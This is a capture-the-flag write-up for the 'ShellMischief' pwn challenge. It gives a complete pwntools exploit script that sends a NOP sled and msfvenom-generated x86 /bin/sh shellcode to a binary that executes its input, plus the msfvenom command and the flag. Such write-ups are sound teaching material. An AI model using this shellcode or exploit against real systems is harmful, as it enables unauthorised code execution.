# ShellMischief
Solved by **CapangJabba**

## Question
Step into the world of ShellMischief! This playful pwn challenge invites you to unleash your most mischievous self. With a sprinkle of creativity and a hint of trickery, can you crack the code and claim victory? Let the mischief begin!

## Solution
the program will ask for input and execute it, but the execution will start randomly at input buffer, so I create a `NOP` sled before the shellcode

```
from pwn import *
from ctypes import CDLL
if args.REMOTE:
   io = remote(sys.argv[1],sys.argv[2])
else:
   io = process("./vuln", )
elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = 'debug'


payload = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
buf =  b""
buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
buf += b"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x00\x57\x53\x89\xe1\xcd\x80"
pause()
io.recvuntil(b'shellcode:\n')

nop_sled = (511 - len(buf))

io.sendline(b'\x90' * nop_sled + buf)

io.interactive()
```

the shellcode use msfvenom

`msfvenom -p linux/x86/exec CMD=/bin/sh -f py`
### Flag
`OSCTF{u_r_b3rry_mischievous_xD}`
